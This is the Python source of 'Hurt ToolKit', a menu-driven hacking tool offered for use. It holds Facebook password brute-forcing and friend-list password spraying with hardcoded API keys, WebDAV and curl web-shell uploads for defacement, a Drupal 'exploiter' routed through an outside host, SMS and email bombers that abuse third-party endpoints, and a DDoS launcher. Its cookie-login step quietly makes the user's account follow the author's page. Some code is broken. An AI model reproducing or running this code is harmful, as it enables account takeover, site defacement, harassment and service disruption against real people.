#!/bin/usr/Python3.8.x
# -*- coding:utf-8 -*-
# Hurt ToolKit v1.0.4 BETA(New Version BETA)
# Programming Language : Python3.8.x, Python2.7.x, Bash

	###############################################
	#	db   db db    db d8888b. d888888b     #
	#	88   88 88    88 88  `8D `~~88~~'     #
	#	88ooo88 88    88 88oobY'    88	      #
	#	88~~~88 88    88 88`8b      88        #
	#	88   88 88b  d88 88 `88.    88	      #
	#	YP   YP ~Y8888P' 88   YD    YP	      #
	###############################################

#--------| Author the Hurt ToolKit
#> LeON
#> Aqnes
#--------| Only they Author Official


'''
Hello, your Decompile in Tool for what?, please don't Published in Decompile Code
'''

# Udah Open Source kontol, tinggal pake aja apa susahnya, PEMALAS

import os,sys,string,re,random,json,datetime,urllib3,hashlib
from time import sleep
from threading import Thread
from prompt_toolkit import prompt
import __init__
from concurrent.futures import ThreadPoolExecutor
try:
	from bs4 import BeautifulSoup as cantik
except:
	os.system('pip install bs4')
try:
	import requests
except:
	exit("\033[0mPlease install 'requests' module")


class Exit:
	def __init__(close):
		close.programs()
	
	def programs(close):
		exit("\nExiting the Programs")

class Date:
	dates = datetime.datetime.now()
	_year = int(dates.year)
	_month = int(dates.month)
	_day = int(dates.day)
	
	_hour = int(dates.hour)
	_minute = int(dates.minute)
	_second = int(dates.second)

class __Verify__:
	def __init__(self):
		self.nno = ''
		self.UID = self.nno.join([random.choice(string.ascii_letters) for i in range(29)])
		self.no = ['n', 'N']
		self.yes = ['y', 'Y']
		self.Verify()
	
	def Verify(self):
		os.system('clear')
		print("\033[0mHello, your new User!")
		print("\n> Your ID user : %s"%(self.UID))
		self.ask = input("\nGet Verification? [y/n] : ")
		if self.ask in self.yes:
			sleep(1)
			os.system('xdg-open https://m.facebook.com/leon101.coder')
			self.leon = open('.remember','w')
			self.leon.write(self.UID)
			self.leon.close()
			exit()
		elif self.ask in self.no:
			exit("\033[1;91m\nYout ID user not Verification, no can't use in Programs!")
		else:
			exit()

class HasVery:
	def __init__(self):
		self.get()
	
	def get(self):
		try:
			self.c = open('.remember', 'r').read()
			self.req = requests.get('https://raw.githubusercontent.com/serverhurttoolkit/member/master/member.txt').text
			if self.c in self.req:
				os.system('rm -rf server/server.txt')
				_Checking()
			else:
				os.system('clear')
				exit("""\033[0m
> ID : %s

> Your ID has not been verified.
> Contact me in: 
	• Facebook  : Maestro Alvardo (Fast Response)
	• Gmail     : mrleeon404@gmail.com (Low Response)
	• What'sApp : +6285366745525 (Not Active)
				"""%(self.c))
		except Exception as s:
			exit("\033[1;91mNo Connection")

class _Checking:
	def __init__(self):
		self.check()
	
	def check(self):
		try:
			self.op = open('.remember.me').read()
			_Menu__()
		except IOError:
			os.system('clear')
			print("\033[0m> Your ID has Verified, and your can use in Programs")
			input("\nPress enter to continue")
			self.opr = open('.remember.me', 'w')
			self.opr.close()
			_Menu__()

class _Menu__:
	def __init__(self):
		self.help = ['--help', 'help']
		self.Main_Menu()
	
	def Main_Menu(self):
		try:
			self.cip = requests.get('https://api.myip.com/')
			self.myip = json.loads(self.cip.text)
			self.ip = self.myip['ip']
#   		self.myid = open('.remember').read()
			self.usra = requests.get("https://raw.githubusercontent.com/serverhurttoolkit/member/master/member.txt").text
			self.op = open('server/server.txt', 'a')
			self.op.write(self.usra)
			self.op.close()
			self.server = 'server/server.txt'
			self.read = '%s'%(len(open(self.server, 'r').read().split("\n")));os.system('clear')
			pass
		except Exception as s:
			os.system('clear')
			exit("No connection")
		try:
			print("""\033[0m

	db   db db    db d8888b. d888888b
	88   88 88    88 88  `8D `~~88~~'
	88ooo88 88    88 88oobY'    88   Author  : LeON
	88~~~88 88    88 88`8b      88   Support : Aqnes
	88   88 88b  d88 88 `88.    88   Version : 1.0.5
	YP   YP ~Y8888P' 88   YD    YP

	      [----| ToolKit |----]
	
  IP User 	 : %s
  User Active    : %s User Active
  Date		 : %s-%s-%s | %s:%s:%s
			"""%(self.ip, len(open(self.server, 'r').read().split("\n")), Date._year, Date._month, Date._year, Date._hour, Date._minute, Date._second))

			while True:
				try:
					os.system('rm -rf server/server.txt')
					self.choose = input(" hurt > ")
					if self.choose in self.help:
						print("""
  --help		Show help
  --version		Show Version the programs
  report problem	To report problem and Fix Bug
  check update		Check what is new
  cookie		Login facebook with Cookie
  token			Login facebook with Token
  login			To Login Facebook Account
  menu			Show menu the programs
  exit			Exit the programs
						""")
					elif self.choose in ['--version', 'version']:
						print("Version 1.0.4")
					elif self.choose in ['report problem']:
						Report_Problem()
					elif self.choose in ['check update']:
						Check_Update()
					elif self.choose in ['cookie']:
						os.system('python __init__.py')
					elif self.choose in ['token']:
						Get_Token()
					elif self.choose in ['login']:
						Login()
					elif self.choose in ['menu']:
						print("""
web information			The tool for Infor Gathering
web hack			The toll for Hack and Atttack
facebook hack			For Hacking Facebook Account
spammer				The tool spam boomber
python obfuscate		For Obfuscate python file
python deobfuscate		For Deobfuscate python file
bash obfuscate			For Obfuscate Bash file
bash deobfuscate		For Deobfuscate Bash file
hurt assistant			The assistant for you
lock				To lock my Termux
						""")
					elif self.choose in ['web information']:
						WebInfo()
					elif self.choose in ['web hack']:
						Web_Hack_Attack()
					elif self.choose in ['facebook hack']:
						Facebook_Hack()
					elif self.choose in ['spammer']:
						Spammer()
					elif self.choose in ['python obfuscate', 'py obf']:
						Python_Obfuscate()
					elif self.choose in ['python deobfuscate', 'py deobf']:
						Python_DeObfuscate()
					elif self.choose in ['bash obfuscate', 'bash obf']:
						Bash_Obfuscate()
					elif self.choose in ['bash deobfuscate', 'bash deobf']:
						Bash_Deobfuscate()
					elif self.choose in ['hurt assistant']:
						Hurt_Assistant()
					elif self.choose in ['lock']:
						Lock()
					elif self.choose in ['exit','close','Exit','Close']:
						Exit()
					else:
						print("\nYour command not found, type '--help'")
				except KeyboardInterrupt:
					exit()
		except KeyboardInterrupt:
			exit()

class Report_Problem:
	def __init__(self):
		self.Report()
	
	def Report(self):
		self.my_problem=input("\n> Explain your problem : ")
		print("""
 Send your message to:
 	• Facebook : https://m.facebook/leon101.coder
 	• Gmail    : mrleeon404@gmail.com
		""")
		input(" Press enter to return main menu")
		_Menu__()

class Check_Update:
	def __init__(self):
		self.Check()
	
	def Check(self):
		self.url = "https://raw.githubusercontent.com/serverhurttoolkit/update/master/update.txt"
		self.Req = requests.get(self.url).text
		if 'Not Update' in self.Req:
			print("\nNot Aviable New Update")
		elif 'Update' in self.Req:
			print("\n There is the latest version v1.0.5 ")
			self.ask = input("Get New Version? [y/n] : ")
			if self.ask in ['y', 'Y']:
				self.Res = open('Update.sh', 'a')
				self.Res.write("""
cd $HOME
rm -rf Hurt
git clone https://github.com/LeON101-coder/Hurt.git
echo "Finish Update new version 1.0.6"
				""")
				self.Res.close()
				os.system('sh Update.sh')
			else:
				input("\nPress enter to return main menu")
				_Menu__()
				

class WebInfo:
	def __init__(self):
		self.ask()
	
	def ask(self):
		self.web=input(" \nWeb Target (Ex : www.examp.com) : ")
		if self.web == "":
			print("\nInvalid Website.")
			self.ask()
		elif 'https://'+self.web in self.web:
			print("\nNot Using (HTTP/HTTPS")
			self.ask()
		elif 'http://'+self.web in self.web:
			print("\nNot Using (HTTP/HTTPS")
			self.ask()
		else:
			pass
		self.hs=input(" Type https or http for your URL : ")
		if self.hs == "https":
			self.hst = '%s://%s'%(self.hs,self.web)
			pass
		elif self.hs == "http":
			self.hst = '%s://%s'%(self.hs,self.web)
			pass
		else:
			print(" Whats is this?")
			input(" Press enter to return again")
			self.ask()
		try:
			print("""\n""")
			print(" > Target : %s"%(self.hst))
			print("""
  geo ip		   Show Geo-IP Lookup
  dns lookup		   The DNS Lookup Tool
  whois			   Whois the Website
  nmap port scan	   For scan port the website
  back			   Back to main menu
  exit			   Exit the Programs
			""")
			while True:
				try:
					self.webinfo=input(" hurt(web information) > ")
					if self.webinfo in ['geo ip']:
						self.url = "http://api.hackertarget.com/geoip/?q=%s"%(self.web)
						self.Req = requests.get(self.url).text
						print("\n%s\n"%(self.Req))
					elif self.webinfo in ['menu','help']:
						print("\n")
						print(" > Target : %s"%(self.hst))
						print("""
  geo-ip                   Show Geo-IP Lookup
  dns-lookup               The DNS Lookup Tool
  whois                    Whois the Website
  nmap-port-scan           For scan port the website
  back                     Back to main menu
  exit                     Exit the Programs
						""")
					elif self.webinfo in ['dns lookup']:
						self.url = "http://api.hackertarget.com/dnslookup/?q=%s"%(self.web)
						self.Req = requests.get(self.url).text
						print("\n%s\n"%(self.Req))
					elif self.webinfo in ['whois']:
						self.url = "http://api.hackertarget.com/subnetcalc/?q=%s"%(self.web)
						self.Req = requests.get(self.url).text
						print("\n%s\n"%(self.Req))
					elif self.webinfo in ['nmap port scan']:
						self.url = "http://api.hackertarget.com/nmap/?q=%s"%(self.web)
						self.Req = requests.get(self.url).text
						print("\n%s\n"%(self.Req))
					elif self.webinfo in ['back']:
						_Menu__()
					elif self.webinfo in ['exit','logout']:
						Exit()
					else:
						print("Your command not found")
				except EOFError:
					exit()
		except KeyboardInterrupt:
			exit()

class Web_Hack_Attack:
	def __init__(self):
		self.Menu()
	
	def Menu(self):
		print("""
deface up file			For deface with file upload
webdav				Deface with Webdav method
drupal mass exploiter		For Exploiter drupal
wp brute			For bruteforce WordPress
checker file upload		File upload Checker
bypas cloudflare		For bypass CloudFlare
hurt ddos			To Attack website
back				Back to main menu
exit				Exit the programs
""")

		while True:
			try:
				self.input = input(" hurt(webhackandattack) > ")
				if self.input in ['deface up file']:
					Web_File_Upload.files()
				elif self.input in ['webdav']:
					Web_Mass_Webdav()
				elif self.input in ['drupal mass exploiter']:
					Drupal_Exploiter()
				elif self.input in ['wp brute']:
					WP_Brute()
				elif self.input in ['checker file upload']:
					os.system('python2 heart/fileupch/_.py')
				elif self.input in ['bypas cloudflare']:
					os.system('python2 heart/cloudbyp/_.py')
				elif self.input in ['hurt ddos']:
					os.system('python heart/DDoS/_.py')
				elif self.input in ['help', '--help', 'menu']:
					self.Menu()
				elif self.input in ['back']:
					_Menu__()
				elif self.input in ['exit']:
					Exit()
				else:
					print("Your command not found")
			except (KeyboardInterrupt, EOFError):
				Exit()

class Web_File_Upload:
	
	
	def files():
		print("\nEnter the Vuln Website.")
		site = input("Target Website : ")
		file = input("Enter your Shell : ")
		try:
			shellop = open(file, 'r').read()
			print("\nUpload %s to %s"%(file,site))
			sleep(2)
			os.system('curl -T %s %s'%(file,site))
		except IOError:
			print("\nFiles '%s' not Found"%(file))
			Exit()
		except Exception as R:
			exit('Target %s not Vulnerable'%s(site))
			
class Web_Mass_Webdav:
	def __init__(self):
		self.Webdav()
	
	def Webdav(self):
		try:
			self.file = input("\nTarget File : ")
			self.checks = open(self.file, 'r')
			pass
		except IOError:
			print("File '%s' not Found"%(self.file))
			sleep(1)
			self.Webdav()
		
		try:
			self.shell = input("Shell : ")
			self.check = open(self.shell).read()
			pass
		except IOError:
			print("File '%s' not Found"%(self.shell))
			sleep(1)
			self.Webdav()
		
		try:
			self.checks = self.checks.readlines()
			print("\n >> %d Total website\n"%(len(self.checks)))
			print(58*"-")
			for self.wb in self.checks:
				try:
					self.site = self.wb.strip()
					if self.site.startswith('http://') is False:
						self.site = 'http://%s'%(self.site)
					self.Req = requests.put(self.site + '/' + self.shell, data=self.check)
					if self.Req.status_code < 200 or self.Req.status_code >= 250:
						print(" Fail    ---> %s/%s"%(self.site, self.shell))
					else:
						print(" Success ---> %s/%s"%(self.site, self.shell))

				except (KeyboardInterrupt, EOFError):
					exit()
					
				except Exception as FN:
					print("\nFinished.")
					input("\nPress enter ..")
					Web_Hack_Attack()
		
		except (KeyboardInterrupt, EOFError):
			exit()
			
class Drupal_Exploiter:
	def __init__(exp):
		exp.Drupal()
	
	def Drupal(exp):
		try:
			exp.File = input("\nTarget File (Ex : target.txt) : ")
			exp.Check = open(exp.File , 'r')
			exp.LineR = exp.Check.readlines()
		except IOError:
			print("File '%s' not Found"%(exp.File))
			exp.Drupal()
		for exp.Compres in exp.LineR:
			exp.Get = exp.Compres.strip()
			try:
				exp.Url = requests.get('http://crig-alda.ro/wp-admin/css/index2.php?url=%s&submit=submit'%(exp.Get))
				exp.R = exp.Url.read()
				if 'Success' in exp.Url:
					print(" Success  ---> %s"%(exp.Get))
					print(" Username ---> HolaKo | Password ---> admin")
					try:
						os.mkdir('result')
					except:
						pass
					exp.Create = open('result/Drupal-Exploter/result.txt', 'a')
					exp.Create.write("[+] %s\n Username ---> HolaKo | Password ---> admin"%(exp.Get))
					exp.Create.close()
					
				else:
					print(" %s ---> Fail Exploit 404"%(exp.Compress))
			except (KeyboardInterrupt, EOFError):
				Exit()
			except Exception as Ro:
				print("%s"%(Ro))

life = []
check = []
id = []
die = 0
result = 0
count = 0
rcheck = 0

class Facebook_Hack:
	def __init__(self):
		self.Check()
	
	def Check(self):
		try:
			os.mkdir('Token')
		except:
			pass
		
		try:
			self.token_read = open('Token/token', 'r').read()
			Menu_Facebook_Hack()
		except IOError:
			try:
				self.cook_read = open('Token/cookie', 'r').read()
				os.system('python __init__.py')
			except IOError:
				self.mssg = """
Not found Token, type 'cookie' or 'token' or type 'login'
For avoid Checkpoint use New Account.
			"""
				print(self.mssg)
		while True:
			try:
				self.excommand = input(" hurt(facebookhack) > ")
				if self.excommand in ['token', 'Token']:
					Get_Token()
				elif self.excommand in ['login', 'Login']:
					Login()
				elif self.excommand in ['cookie']:
					os.system('python __init__.py')
				elif self.excommand in ['help', '--help']:
					self.helped = """
--help 				Show Help
menu				Show menu the Facebook Hack
login				Login Facebook Account
token				Login Facebook with Token
cookie				Login Facebook with Cookie
back				Back to main menu
exit				Exit the programs
						"""
					print(self.helped)
				elif self.excommand in ['menu', 'Menu']:
					self.Menu_ = """
bruteforce			Hack Facebook With Bruteforce
bruteforce file			Bruteforce --from File ID
hack list friend		Crack from my List Friend
hack from friend		Crack from Friend
hack from query			Crack from Search Query
hack from group			Crach from Group
						"""
					print(self.Menu_)
				else:
					self.error = """
Type '--help' to Helped you
						"""
					print(self.error)
			except (KeyboardInterrupt, EOFError):
				_Menu__()

class Login:
	
	def __init__(self):
		self.Login_Account()
	
	def Login_Account(self):
		try:
			
			print("\n> Login Account Facebook to get Token.")
			self.username = input("\n> Username : ")
			self.password = prompt("> Password : ",is_password=True)
			self.API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32'
			self.data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":self.username,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":self.password,"return_ssl_resources":"0","v":"1.0"}
			self.sig = ('api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+self.username+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+self.password+'return_ssl_resources=0v=1.0'+self.API_SECRET).encode('utf-8')
			self.md5 = hashlib.new('md5')
			self.md5.update(self.sig)
			self.data.update({'sig':self.md5.hexdigest()})
			self.Ser = requests.get('https://api.facebook.com/restserver.php',params=self.data)
			self.compr = self.Ser.json()['access_token']
			self.op = open('Token/token', 'a')
			self.op.write(self.compr)
			self.op.close()
			print("\n Success generate token.")
			input("Press enter to menu")
			_Menu_Facebook()
		except KeyError:
			print("\n Failed generate token.")
			input("Press enter to return")
			os.system('rm -rf Token/token')
		except (KeyboardInterrupt, EOFError):
			Exit()
		except Exception as F:
			exit(" \nNo Connection")

class Get_Token:
	
	def __init__(self):
		self.Get()
	
	def Get(self):
		try:
			
			print("\n > Enter your Token to login account\n")
			self.token = input(" > Token : ")
			self.Check = requests.get('https://graph.facebook.com/me?access_token=%s'%(self.token))
			self.comp = json.loads(self.Check.text)
			self.id = self.comp['id']
			self.op = open('Token/token', 'a')
			self.op.write(self.token)
			self.op.close()
			print("\n > Login Successful")
			input("Press enter to menu")
			_Menu_Facebook()
		except KeyError:
			print(" \n> Login Failed.")
			input("Press enter to return")
			os.system('rm -rf Token/token')
		except Exception as L:
			exit("No Connection")

class Cookie:
	def __init__(self):
		try:
			os.mkdir('Token')
		except:
			pass
		self.Get()
	
	def Get(self):
		print("""
		""")
		self.cookie = input(' > Enter Your Cookie : ')
		self.ops = open('Token/cookie', 'a')
		self.ops.write(self.cookie)
		self.ops.close()
		self.cookie = {"cookie":self.cookie}
		self.h3h3 = cantik(requests.get('https://mbasic.facebook.com{}'.format("/leon101.coder"),cookies=self.cookie).content,"html.parser").find("a",string="Ikuti")["href"]
		requests.get('https://mbasic.facebook.com{}'.format(self.h3h3),cookies=self.cookie)
		_Menu_Facebookk()
		

class _Menu_Facebook:
	
	def __init__(self):
		self.mennu()
	
	def mennu(self):
		try:
			self.Get_MyInfo = open('Token/token', 'r').read()
			pass
		except IOError:
			Facebook_Hack()
		
		try:
			self.Req = requests.get('https://graph.facebook.com/me?access_token=%s'%(self.Get_MyInfo))
			self.jsn = json.loads(self.Req.text)
			self.Name = self.jsn['name']
			print("""
      > Name : %s

bruteforce                      Hack Facebook With Bruteforce
bruteforce file                 Bruteforce --from File ID
hack list friend                Crack from my List Friend
hack from friend                Crack from Friend
hack from query                 Crack from Search Query
hack from group                 Crach from Group
			"""%(self.Name))
			while True:
				try:
					self.fbchoose = input(" hurt(facebookhack) > ")
					if self.fbchoose in ['--help', 'help']:
						self.fbhelp = """
						
						"""
						print(self.fbhelp)
					elif self.fbchoose in ['menu']:
						self.fbmenu = """

						"""
						print(self.fbmenu)
					elif self.fbchoose in ['back', 'back to main menu']:
						_Menu__()
				
				except (KeyboardInterrupt, EOFError):
					Exit()
		except KeyError:
			exit("Account has been Checkpoint")
		except (KeyboardInterrupt, EOFError):
			Exit()
		except Exception as FO:
			exit("No connection")

class _Menu_Facebookk:
	def __init__(self):
		try:
			os.mkdir('Result')
		except:
			pass
		self.Menuu()
			
	def Menuu(self):
		print("""
bruteforce                      Hack Facebook With Bruteforce
hack list friend                Crack from my List Friend
hack from friend                Crack from Friend
hack from query                 Crack from Search Query
hack from group                 Crach from Group
		""")
		while True:
			try:
				self.zcommand = input(" hurt(facebookhack) > ")
				if self.zcommand in ['bruteforce']:
					Bruteforce ()
				elif self.zcommand in ['hack list friend']:
					Hack_ListFriend()
			except (KeyboardInterrupt, EOFError):
				Exit()

class Bruteforce:
	def __init__(self):
		self.brute()
	
	def brute(self):
		print("\n")
		self.Target = input("• Target   : ")
		self.WL = input("• Wordlist : ")
		try:
			self.Op = open(self.WL, 'r')
			self.Total = self.Op.readlines()
			pass
		except IOError:
			print(" > Wordlist not found")
		
		sleep(1)
		print("\n• %s Total Password"%(str(len(self.Total))))
		for self.pas in self.Op:
			try:
				self.pas = self.pas.replace("\n", "")
				sys.stdout.write("• Trying ---> %s"%(self.pss))
				sys.stdout.flush()
				self.Datas = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(self.Target)+"&locale=en_US&password="+(self.pas)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
				self.Jsn = json.loads(self.Datas.text)
				if 'access_token' in self.Jsn:
					print("\nFound (Life)---> %s | %s"%(self.Target, self.pas))
					input("\n Press enter")
					_Menu_Facebookk()
				elif 'www.facebook.com' in self.Jsn["error_msg"]:
					print("\nFound (Checkpoint)---> %s | %s"%(self.Target, self.pas))
					input("\n Press enter")
					_Menu_Facebookk()
			except (KeyboardInterrupt, EOFError):
				print("Stopped")
				_Meni_Facebookk()

class Bruteforce_File:
	def __init__(self):
		self.Brute()
	
	def Brute(self):
		print("\n")
		global idlist, passw, file
		self.fileID = input("• File ID  : ")
		try:
			self.Op = open(self.fileID).read()
		except IOError:
			print(" File not Found")
		
		self.passw = input("• Password : ")

def getusr(friend):
	II = requests.get(friend,cookies=self.Cookie).content
	getid = re.findall('middle"><a class=".." href="(.*?)">(.*?)</a>',str(II))
	for L in getid:
		if 'profile' in L[0]:
			id.append(L[1] + '|' + re.findall("=(\d*)?",str(L[0]))[0])
		elif 'friends' in L:
			continue
		else:
			id.append(L[1] + '|' + L[0].split('/')[1].split('?')[0])
		
		print("\r• Total ID --> "+str(len(id)), end="")
	if 'Lihat Teman Lain' in str(II):
		getid('https://mbasic.facebook.com{}'.format(cantik(II,'html.parser').find('a',string='Lihat Teman Lain')['href']))
	return id

def login(username, password, cek=Cookie):
	global rcheck, die, result, count
	API = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
	DATA = {
		'access_token': API,
		'format': 'JSON',
		'sdk_version': '2',
		'email': username,
		'password': password,
		'sdk': 'ios',
		'generate_session_cookies': '1',
		'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
		}
	APIS = 'https://b-api.facebook.com/method/auth.login'
	res = requests.get(APIS, params=DATA)
	if 'EAA' in res.text:
		print(f'\rLife ---> {username} | {password}', end="")
		result +=1
		if cek:
			life.append(username+" | "+password)
		else:
			with open('Result/Life', 'a') as Lif:
				Lif.write(username+" | "+password+"\n")
	elif 'www.facebook.com' in res.json()['error_msg']:
		print(f'\rCheck ---> {username} | {password}', end="")
		rcheck +=1
		if cek:
			check.append(username+" | "+password)
		else:
			with open('Result/Check', 'a') as Cek:
				Cek.write(username+" | "+password+"\n")
	else:
		die +=1
	
	for l in list('....'):
		print(f'\r[{l}] Life ---> [{str(result)}] Check ---> [{str(rcheck)}] Die ---> [{str(die)}]', end="")
		sleep(0.1)
		
		
class Hack_ListFriend:
	def __init__(self):
		self.Start()
	
	def Start(self):
		try:
			self.Cooki = open('Token/cookie').read()
			Cookie = {"cookie":self.Cooki}
		except IOError:
			print("Error 404")
		friend = cantik(requests.get('https://masic.facebook.com{}'.format('/me'),cookies=Cookie).content,'html.parser').find('a',string='Teman')
		username = getusr('https://mbasic.facebook.com{}'.format(friend["href"]))
		
		print(58*"-")
		with ThreadPoolExecutor(max_workers=30) as ex:
			for usern in username:
				user = usern.split('|')
				Le = user[0].split(' ')
				for Leon in Le:
					listpassw = [str(Leon) + '123', str(Leon) + '12345', str(Leon) + '123456', str(Leon) + '123321', str(Leon) + '12', str(Leon) + '1234567890', str(Leon) + '54321', str(Leon) + '0987654321', 'sayang', 'cintaku', 'sayang123', 'sayang12345', 'sayang123321', 'sayang321', 'sayangku', 'sayang123456', 'sayangku123', 'sayangku12', 'sayangku321', 'kontol', 'kontol12', 'kontol123', 'kontol1234', 'kontol12345', 'kontol321', 'kontol123456', 'bangsat', 'bangsat123', 'bangsat1234', 'bangsat12345', 'bangsat123455', 'fucek', 'indonesia', 'bandung', 'amerika', 'fucek123', '@@@@@@@@', '0987654321asd', 'asd1234567890', '1234567890asd', 'asd0987654321', 'memek123', 'memek1234', 'memek12345', 'freefire', 'pubg12345', 'freefire123', 'cintacinta', 'doraemon', 'loli12345', 'sagiri', 'sagiri123', 'naruto123', 'naruto12345', 'mobilelegend', 'mobillejen', 'mobilelegend123', 'aov12345', 'makasar123', 'asu12345', 'kamvret123', 'bujang123', 'kenthu123', 'kenthu12345', 'k&212345', 'nguwe123', 'ngentod', 'ngentod123', 'meme12345', 'jungkook', 'jungkook123', 'lalisa123', 'lalisa', 'manoban123', 'jimin123', 'jinxpro123', 'asdfghjkl', 'qwerty123', 'qwerty12345']
					for passwordn in set(listpassw):
						ex.submit(login, (user[1]), (passwordn))
		if rcheck !=0 or result !=0:
			print("\nDone, Check in Dictionary 'Result'")
		
		else:
			print(" No Result")

class Spammer:
	def __init__(self):
		self.spam()
	
	def spam(self):
		print("""
phone sms boomber		Spam SMS number phone
gmail boomber			Spam Gmail Account
		""")
		while True:
			try:
				self.scommand = input(" hurt(spammer) > ")
				if self.scommand in ['phone sms boomber']:
					Phone()
				elif self.scommand in ['gmail boomber']:
					Gmail.spam()
				else:
					print("Hurt err : not found")
			except (KeyboardInterrupt, EOFError):
				Exit()

class Phone:
	def __init__(self):
		self.num()
	
	def num(self):
		print("\n")
		self = input(" Number Phone : (Ex : 0813xx) > ")
		self = int(input(" Jumlah : "))
		h = sehat()
		for a in range(jum):
			h.sehat(num)
	
	def sehat(self, num):
		head={
			'accept': 'application/json, text/javascript, */*; q=0.01',
			'origin': 'https://www.prosehat.com',
			'x-requested-with': 'XMLHttpRequest',
			'user-agent': 'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36',
			'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'referer': 'https://www.prosehat.com/akun',
		}
		ata={'phone_or_email':num,'action':'ajaxverificationsend'}

		req=requests.post('https://www.prosehat.com/wp-admin/admin-ajax.php',data=ata,headers=head)
#		print(req.text)
		if "token" in req.text:
			print(" Success ✓")
			for x in range(60):
				print(end=f"\r>> Sleep {60-(x+1)}s << ",flush=True)
				time.sleep(1)
			print()
		else:
			print(f" Fail {req.text}")
			for x in range(60):
				print(end=f"\r>> Sleep {60-(x+1)}s << ",flush=True)
				time.sleep(1)
			print()

c = int(0)
scc = int(0)
fail = int(0)

class Gmail:
	
	def spam():
		try:
			em = input(" Target Email : ")
			jum = input(' Jumlah : ')
			while (c < int(jum)):
				s='200'
				d=({'email':em,
				'device_id':'6bb443543d62ab32'})
				u=({'User-Agent':'surveyon/2.0.3 (Android: 6.0.1; MODEL:ASUS_X00AD; PRODUCT:WW_Phone; MANUFACTURER:asus;)'})
				r=requests.post('https://www.surveyon.com/surveyon_api/mobile/v1_1/signup/confirmation_key',data=json.dumps(d), headers=u)
				if str(s) in str(r.text):
					scc+=1
					print(" Success ")
				else:
					fail+=1
					print(" Failed ")

				sys.stdout.flush()
				sleep(1)
				c+=1
		except:
			print("Error 404")

class Hash:
	def __init__(self):
		self.hash()
	
	def hash(self):
		print("""
encript				Encript hash
decript				Decript Hash
		""")
		while True:
			try:
				self.hcommand = input(" hurt(hash) > ")
				if self.hcommand in ['encript', 'Encript']:
					Hash_Encript()
				elif self.hcommand in ['decript', 'Decript']:
					Hash_Decript()
			except (KeyboardInterrupt, EOFError):
				Exit()


class Python_Obfuscate:
	def __init__(self):
		self.obf()
	
	def obf(self):
		print("""
python3
python2
		""")
		while True:
			try:
				self.obcommand = input(" hurt(pythonobf) > ")
				if self.obcommand in ['python3']:
					self.Py3()
				elif self.obcommand in ['python2']:
					self.Py2()
				elif self.obcommand in ['--help', 'help', 'menu']:
					self.obf()
				else:
					print(" Hurt err : not found")
			except (KeyboardInterrupt, EOFError):
				Exit()
	
	def Py3(self):
		try:
			os.mkdir('Python-Obfuscate')
		except:
			pass
		try:
			self.File = input('\n File : ')
			self.Op = open(self.File).read()
			sleep(1)
			os.system("python Data/___main__.py %s ' '"%(self.File))
			print(" Result : Obfuscate/Result_py3.py")
			print("")
		except IOError:
			print(" File not found")
	
	def Py2(self):
		try:
			os.mkdir('Python-Obfuscate')
		except:
			pass
		try:
			self.File = input("\n File : ")
			self.Op = open(self.File).read()
			sleep(1)
			os.system("python Data/__parser__.py %s ' '"%(self.File))
			print(" Result : Obfuscate/Result_py2.py")
			print("")
		except IOError:
			print(" File not Found")

class Python_DeObfuscate:
	def __init__(self):
		self.deob()
	
	def deob(self):
		print("""
python3
python2
		""")
		while True:
			try:
				self.dobcommand = input(" hurt(pythondeobf) > ")
				if self.dobcommand in ['python3']:
					self.Pyy3()
				elif self.dobcommand in ['python2']:
					self.Pyy2()
				elif self.dobcommand in ['--help', 'help', 'menu']:
					self.deob()
				else:
					print(" hurt error : not Found")
			
			except (KeyboardInterrupt, EOFError):
				Exit()
	
	def Pyy3(self):
		print("""
pyc			Deobfuscate pyc to py
other
		""")
		while True:
			try:
				self.py3command = input(" hurt(pythondeob/py3) > ")
				if self.py3command in ['pyc']:
					try:
						os.mkdir('Python-Deobfuscate')
					except:
						pass
					try:
						self.File = input("\n File : ")
						self.op = open(self.File).read()
						os.system('uncompyle6 %s >> Python-Deobfuscate/Result_pyc.py')
						print(" Result : Python-Deobfuscate/Result_pyc.py")
					except IOError:
						print(" File not Found")
				elif self.py3command in ['other']:
					print(" You can Deobfuscate with Online or Manual Decompile")
				else:
					print(" Hurt err : not Found")
			except (KeyboardInterrupt, EOFError):
				Exit()
	
	def Pyy2(self):
		print("""
pyc			Deobfuscate pyc to py
other
		""")
		while True:
			try:
				self.py2command = input(" hurt(pythondeob/py2) > ")
				if self.py3command in ['pyc']:
					try:
						os.mkdir('Python-Deobfuscate')
					except:
						pass
					try:
						self.File = input("\n File : ")
						self.op = open(self.File).read()
						os.system('uncompyle6 %s >> Python-Deobfuscate/Result_pyc.py')
						print(" Result : Python-Deobfuscate/Result_pyc.py")
					except IOError:
						print(" File not Found")
				elif self.py2command in ['other']:
					print(" You can Deobfuscate with Online or Manual Decompile")
				else:
					print(" Hurt err : not Found")
			except (KeyboardInterrupt, EOFError):
				Exit()

class Bash_Obfuscate:
	def __init__(self):
		self.bash()
	
	def bash(self):
		try:
			os.mkdir('Bash-Obfuscate')
		except:
			pass
		
		try:
			self.File = input(" File : ")
			self.Op = open(self.File, 'r').read()
			pass
		except IOError:
			print(" File not Found")
			self.bash()
		
		os.system('bash-obfuscate %s -o Bash-Obfuscate/Result.sh'%(self.File))
		sleep(1)
		print(" Result : Bash-Obfuscate/Result.sh")

class Bash_Deobfuscate:
	def __init__(self):
		self.de()
	
	def de(self):
		try:
			os.mkdir('Bash-Deobfuscate')
		except:
			pass
		try:
			self.File = input(" File : ")
			self.op = open(self.File).read()
			self.Dec = self.op.replace('eval', 'echo')
			self.Op = open('Result.sh', 'a')
			self.Op.write(self.Dec)
			self.Op.close()
			os.system('touch Bash-Deobfuscate/Result.sh')
			os.system('bash Result.sh > Bash-Deobfuscate/Result.sh')
			os.remove('Result.sh')
			print(" Result : Bash-Deobfuscate/Result.sh")
		except IOError:
